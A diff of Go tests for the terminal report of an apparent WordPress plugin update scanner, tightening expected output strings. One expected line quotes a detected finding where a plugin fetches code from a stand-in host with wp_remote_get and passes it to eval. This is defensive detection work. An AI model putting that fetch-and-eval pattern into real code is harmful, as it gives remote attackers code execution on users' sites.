@@ -177,7 +177,7 @@ func TestTerminalLayout(t *testing.T) {
 		"  ▸ Changelog     2.6.8: \"Check compatibility with WordPress 6.8\"\n",
 		"  CRITICAL  11 ─",
 		" ▌  CRITICAL   Fetches remote code and runs it",
-		"includes/class-wpos-analytics.php:88\n",
+		"includes/class-wpos-analytics.php:88 #7\n",
 		" ▌             → Review remote-fetch-exec before you update.\n",
 		" ▌             raised by owner-change\n",
 		"╭",
@@ -242,7 +242,7 @@ func TestTerminalPlain(t *testing.T) {
 	for _, want := range []string{
 		"rhythm sightread 1.0.0 - wp-plugin countdown-timer-ultimate - 2.6.7 to 2.6.8\n",
 		"note: --skip-roadie-verify was used\n",
-		"[CRITICAL] Fetches remote code and runs it - includes/class-wpos-analytics.php:88\n",
+		"[CRITICAL] Fetches remote code and runs it - includes/class-wpos-analytics.php:88 (#7)\n",
 		"  evidence: wp_remote_get('https://analytics.wpos-cdn.example/v2/p') → eval($body)\n",
 		"  advice: Review remote-fetch-exec before you update.\n",
 		"  raised by: owner-change\n",
@@ -473,7 +473,8 @@ func TestTerminalUnverifiedDiffed(t *testing.T) {
 	if strings.Contains(out, "Not diffed") || strings.Contains(out, "not diffed") {
 		t.Errorf("a diffed update says it was not diffed:\n%s", out)
 	}
-	if !strings.Contains(out, "▸ Diff          2 files changed") || !strings.Contains(out, "UNVERIFIED  │") {
+	// Diffed, so the box says what its findings alone would make it.
+	if !strings.Contains(out, "▸ Diff          2 files changed") || !strings.Contains(out, "UNVERIFIED (would be ROUTINE)  │") {
 		t.Errorf("no diff line or verdict:\n%s", out)
 	}
 	if got := tableFindings(u); got != "" {
